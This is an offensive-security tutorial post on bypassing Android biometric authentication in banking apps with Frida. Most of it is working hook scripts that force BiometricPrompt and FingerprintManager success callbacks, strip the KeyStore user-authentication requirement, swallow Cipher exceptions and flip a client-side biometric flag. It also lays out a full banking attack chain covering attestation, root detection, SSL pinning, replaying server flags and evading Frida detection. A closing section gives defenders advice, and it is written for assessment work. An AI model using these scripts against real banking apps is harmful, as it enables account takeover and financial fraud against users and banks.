---
title: "Bypassing Android Biometric Authentication via Frida"
description: "Hooking BiometricPrompt callbacks and CryptoObject to bypass fingerprint/face authentication in Android banking apps - covering the full BiometricPrompt API, KeyStore-backed gating, hardware-backed strong biometrics, and a practical Frida bypass chain."
date: 2026-03-07
difficulty: Hard
tags: [biometric, frida, android, bypass, banking]
---

## How Android Biometrics Work

Apps use `BiometricPrompt` with an `AuthenticationCallback`. On success, the callback receives a `CryptoObject` containing an authenticated `Cipher` that can decrypt protected data.

That single sentence hides a multi-layer architecture. Understanding each layer is essential because a bypass that defeats one but not another silently fails - the app's UI shows "authenticated" but the protected secret is still inaccessible, and any subsequent API call that depends on it crashes.

### Layer 1 - The UI Gate

`BiometricPrompt` (introduced in Android 9 / API 28, replacing `FingerprintManager`) is the system-provided UI for biometric capture. The app instantiates a prompt, sets a callback, and calls `authenticate()`:

```java
BiometricPrompt prompt = new BiometricPrompt.Builder(context)
    .setTitle("Confirm with fingerprint")
    .setNegativeButton("Cancel", executor, (d, w) -> {})
    .build();

prompt.authenticate(cancellationSignal, executor, callback);
```

The callback exposes three terminal states:

```java
void onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult result);
void onAuthenticationFailed();
void onAuthenticationError(int errorCode, CharSequence errString);
```

A naive app reads only `onAuthenticationSucceeded` as a green light. That class of app is trivial to bypass - invoke the success callback yourself and the app proceeds.

### Layer 2 - The KeyStore Gate

Better-engineered apps don't trust the callback; they trust the `CryptoObject` it carries. The flow:

1. App generates a `SecretKey` with `setUserAuthenticationRequired(true)` - meaning the key can only be used after a recent biometric authentication.
2. App initialises a `Cipher` with that key. If no recent biometric, the `Cipher.init()` throws `UserNotAuthenticatedException`.
3. App passes the un-initialised `Cipher` into a `BiometricPrompt.CryptoObject` and starts the prompt.
4. On success, the framework "authorises" the key, and the `Cipher` returned in `AuthenticationResult.getCryptoObject().getCipher()` becomes usable.
5. The app uses the `Cipher` to decrypt secrets stored at install time (e.g. encrypted login session token, encrypted biometric-token-mapped backend authentication credential).

Bypassing only the callback leaves the `Cipher` un-authorised. Step 5 throws, and the app is broken in a "user did not authenticate" way. To actually use the protected data you need to either remove the `setUserAuthenticationRequired(true)` constraint *before* the key was generated, or hook the `Cipher` operations to bypass them entirely.

### Layer 3 - Hardware-Backed Strong Biometrics

On modern devices (Android 11+, especially Class 3 / "Strong" biometrics), the key material lives in the secure element (TEE / StrongBox / TitanM). The TEE itself decides whether the biometric matched and produces a "biometric authentication token" cryptographically bound to the key. User-mode hooks cannot forge this - the TEE simply will not release the key without a valid token from the biometric driver.

For these apps a runtime hook bypass alone *cannot* unlock real protected data. The bypass becomes useful only against:

- **Class 2 (Weak)** biometrics where the matching is partly software-side.
- **Apps that don't actually bind the key to user authentication** (the majority - most banking apps gate UI flow via biometrics but encrypt/decrypt with simpler flow).
- **Server-side gating** where the app sends a "biometric_passed: true" flag and the server trusts it.

In assessments you'll find that the third case is far more common than security marketing suggests.

## The Bypass

Hook `BiometricPrompt.AuthenticationCallback.onAuthenticationSucceeded()` and invoke it manually with a crafted `AuthenticationResult`. For apps using CryptoObject, also hook `KeyGenParameterSpec.Builder.setUserAuthenticationRequired()` to disable the authentication requirement on the key itself.

The complete bypass is a three-step pipeline. Each step targets a specific layer.

### Step 1 - Trigger the Success Callback

```javascript
Java.perform(function () {
    var BP = Java.use('android.hardware.biometrics.BiometricPrompt');
    var BP_AR = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
    var BPCallback = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');

    // Replace authenticate() so it immediately fires success
    BP.authenticate.overload(
        'android.os.CancellationSignal',
        'java.util.concurrent.Executor',
        'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
    ).implementation = function (cancel, executor, callback) {
        console.log('[+] BiometricPrompt.authenticate intercepted - forcing success');
        var fakeResult = BP_AR.$new(null, 1);   // CryptoObject=null, AuthenticationType=BIOMETRIC
        callback.onAuthenticationSucceeded(fakeResult);
    };

    // Same for AndroidX BiometricPrompt
    var XBP = Java.use('androidx.biometric.BiometricPrompt');
    XBP.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo')
        .implementation = function (info) {
        console.log('[+] AndroidX BiometricPrompt.authenticate intercepted');
        var XBP_AR = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
        var fake = XBP_AR.$new(null, 2);
        var cb = this.mAuthenticationCallback.value;
        cb.onAuthenticationSucceeded(fake);
    };
});
```

For apps using the legacy `FingerprintManager` (pre-API 28, still common in Indian / SE-Asian banking apps that target older devices):

```javascript
var FM = Java.use('android.hardware.fingerprint.FingerprintManager');
var FM_AR = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
FM.authenticate.implementation = function (cryptoObject, cancel, flags, callback, handler) {
    console.log('[+] FingerprintManager.authenticate intercepted');
    callback.onAuthenticationSucceeded(FM_AR.$new(cryptoObject, null, 0));
};
```

### Step 2 - Disable the KeyStore Authentication Requirement

If the app generates its key with `setUserAuthenticationRequired(true)` *during runtime* (for instance, on first launch / after PIN setup), hook the builder *before* the key is generated. This often requires hooking very early in app lifecycle:

```javascript
var KGPS_Builder = Java.use('android.security.keystore.KeyGenParameterSpec$Builder');
KGPS_Builder.setUserAuthenticationRequired.implementation = function (required) {
    console.log('[+] setUserAuthenticationRequired(' + required + ') → forced false');
    return this.setUserAuthenticationRequired(false);
};

// API 28+: setUserAuthenticationParameters(int, int) is preferred
KGPS_Builder.setUserAuthenticationParameters.overload('int','int').implementation = function (timeout, type) {
    console.log('[+] setUserAuthenticationParameters intercepted');
    return this.setUserAuthenticationParameters(0, 1);   // 0s timeout, type=DEVICE_CREDENTIAL
};

// validity duration is the older API
KGPS_Builder.setUserAuthenticationValidityDurationSeconds.implementation = function (sec) {
    console.log('[+] setUserAuthenticationValidityDurationSeconds(' + sec + ') → 9999999');
    return this.setUserAuthenticationValidityDurationSeconds(9999999);
};
```

This works only if the key has not yet been generated. For an app installed on the device with the protected key already in the AndroidKeyStore, you need step 3.

### Step 3 - Bypass the `Cipher` Authentication Check

If the key was already generated with the constraint, use a different angle: hook the `Cipher` so calls to `init` no longer fail with `UserNotAuthenticatedException`, and `doFinal` returns plausible plaintext.

```javascript
var Cipher = Java.use('javax.crypto.Cipher');

Cipher.doFinal.overload('[B').implementation = function (data) {
    try {
        return this.doFinal(data);
    } catch (e) {
        console.log('[!] Cipher.doFinal threw: ' + e + ' - returning input unchanged');
        return data;   // pass-through; works only if the consumer tolerates it
    }
};

// Some apps use a pre-authenticated Cipher and check whether init() succeeded.
// We can no-op init() to claim success without actually authenticating the key.
Cipher.init.overload('int', 'java.security.Key').implementation = function (mode, key) {
    try {
        this.init(mode, key);
    } catch (e) {
        console.log('[!] Cipher.init threw: ' + e + ' - silently swallowed');
    }
};
```

The third hook is risky - when the app *does* depend on the Cipher's output, returning input unchanged crashes the next stage. The cleanest approach in production assessments is to extract the encrypted secret from `SharedPreferences`, find where it would be decrypted, and target that specific call site.

### The "Just Skip the Whole Branch" Approach

Some apps gate the whole biometric layer behind a feature flag. If the flag is checked client-side (it usually is), you can flip it directly:

```javascript
var SettingsManager = Java.use('com.victim.bank.SettingsManager');
SettingsManager.isBiometricRequired.implementation = function () {
    console.log('[+] isBiometricRequired() → false');
    return false;
};
```

Identifying the right manager class is a 10-minute jadx search for "biometric" or "fingerprint" in the decompiled source - almost always reveals the gating function.

## Banking App Specifics

Many banking apps check biometric authentication before displaying account details or authorizing transactions. The bypass chain is: disable root detection → patch biometric check → intercept the API call that follows.

### The Full Banking Bypass Chain

A real assessment chain in execution order:

1. **Frida server install + patched stub for SafetyNet/Play Integrity bypass**. Many banks reject any biometric ceremony if the device fails attestation. Bypass this first via [Magisk + Shamiko + Play Integrity Fix](https://github.com/chiteroman/PlayIntegrityFix), or hook the Java attestation client to return a hardcoded "passed" result.
2. **Root detection bypass**. Hook `File.exists` for `/system/xbin/su`, `Runtime.exec("which su")`, package manager queries for known root managers, mount point checks for `/data/local/tmp` writability, and SELinux `getenforce`. Any commercial banking RASP toolkit (Promon Shield, Appdome, Guardsquare DexGuard) chains 30-50 such checks; defeat them all or none execute.
3. **SSL pinning bypass**. (See the SSL pinning bypass post.) Without this, you can't observe the API contract that follows biometric success.
4. **Biometric bypass** (this post). Force the prompt to return success.
5. **Server-side flag interception**. Burp / mitmproxy on the resulting traffic. Look for `"bio_authenticated": true`, `"step_up": "completed"`, `"riskScore": "low"` - set these in repeater and replay protected actions.
6. **Transaction authorisation**. The most-protected operations (wire transfers, beneficiary additions) often require an *additional* per-transaction biometric ceremony, sometimes signing the transaction details with a TEE-bound key. Steps 1-4 don't help here - only step 5 (server-trusts-flag) does.

### What Banking RASP Looks Like

Modern Android banking apps detect Frida specifically. Common signals:

- `frida-server` listening on `27042`.
- `gum-js-loop`, `gmain`, `gdbus` named threads in `/proc/self/task/*/comm`.
- Memory mappings with names like `frida-agent-*`.
- `dlopen` of `frida-gadget` libraries.
- Hooked function detection - read the first 16 bytes of `BiometricPrompt.authenticate` and verify it matches the expected ART code.

Counter-measures: rename frida-server, randomise port, use [frida-stalker](https://frida.re/docs/stalker/), or move to instrumentation that doesn't require Frida (e.g. [Objection](https://github.com/sensepost/objection) for orchestration but [LSPosed](https://github.com/LSPosed/LSPosed) modules for actual hooks - ART-level hooks via Yahfa are harder to detect than Frida's stalker-based ones).

### The Fingerprint of a Server-Trusts-Flag Bug

If the bypass succeeds end-to-end with no additional crypto, the server is implicitly trusting a client-asserted flag. This is a **CWE-602 (Client-Side Enforcement of Server-Side Security)** finding and almost always present in apps with sub-par biometric integrations. Document it; the fix is server-side cryptographic verification of the biometric ceremony, not better client-side gating.

## Detection Side

For defenders building biometric flows that survive instrumentation:

1. **Bind the key to user authentication** with `setUserAuthenticationRequired(true)` and `setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG)`.
2. **Use the CryptoObject** flow - never a callback-only flow.
3. **Verify the cipher operation server-side** by encrypting/decrypting a server-issued nonce inside the biometric ceremony. The server validates the cryptographic result, not a flag.
4. **Use Class 3 Strong biometrics** explicitly; reject the prompt on devices that only offer Weak biometrics.
5. **Attest the device** with Play Integrity API on every biometric-protected action and reject if the attestation downgrades.
6. **Detect Frida** as one of many signals (don't single-source) and respond with progressive friction (additional step-ups, server-side velocity checks) rather than instant logout, so attackers can't fingerprint your detections by observation.

> Biometric bypass is the gateway to full app compromise in mobile assessments. Combined with SSL pinning bypass, you can intercept every API call the app makes - and if the server trusts client-asserted authentication state, every protected action becomes accessible. The assessor's job is to make the difference between "client says authenticated" and "server can prove the user actually authenticated" visible to the engineering team.
